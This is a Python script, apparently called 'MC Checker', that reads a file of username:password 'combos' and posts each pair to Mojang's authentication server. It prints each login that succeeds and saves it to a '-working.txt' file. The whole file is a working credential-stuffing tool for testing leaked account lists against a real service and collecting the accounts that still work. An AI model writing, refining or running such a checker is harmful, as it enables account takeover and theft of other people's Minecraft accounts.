class mcChecker():
    __version__ = 0.1

import time, ctypes, colorama, aiohttp, asyncio, requests, re
from colorama import Fore, init
from requests.structures import CaseInsensitiveDict

headers = CaseInsensitiveDict()
headers["Content-Type"] = "application/json"
url = "https://authserver.mojang.com/authenticate"

init()
ctypes.windll.kernel32.SetConsoleTitleW(f'[MC Checker v{mcChecker.__version__}]')
GREEN = "\033[1;32m"
RED = "\033[1;31m"

async def checker():
        combos = input("Where are the combos located?\n")
        num = 0
        valid = 0
        start = time.time()
        with open(combos, encoding='utf-8-sig') as f:
                lines = f.readlines()
                start = time.time()
                for line in lines:
                    try:
                        search = ("{}".format(line.strip())) # remove empty space
                        regex = re.search("^[^:]+\s*", search) # content before colon
                        username = regex.group() # makes username a grouped regex
                        regex = re.search("(?<=:).*", search) # content after colon
                        password = regex.group() # makes password a grouped regex
                        data = '{"username":"' +username+ '", "password":"' +password+ '"}'
                        resp = requests.post(url, headers=headers, data=data)
                        if resp.status_code == 200:
                            print(f"Account found with the following credentials\n{Fore.BLUE}Username: {Fore.GREEN} {username}\n{Fore.BLUE}Password: {Fore.GREEN} {password} {Fore.RESET}")
                            txt = open(f"{combos}-working.txt", "a")
                            txt.write(f"{line}")
                            txt.close()
                            valid +=1
                    except:
                        pass
                    num +=1    
                    ctypes.windll.kernel32.SetConsoleTitleW(f'[MC Checker v{mcChecker.__version__} | Checked {num}/{len(lines)}] | Valid {valid}/{num} ')
        end = time.time()
        elapsed_time = end - start
        print("Done\n")
        print("Processed "+str(num)+" combos in "+str(int(elapsed_time))+" seconds.")

loop = asyncio.get_event_loop()
loop.run_until_complete(checker())
loop.close()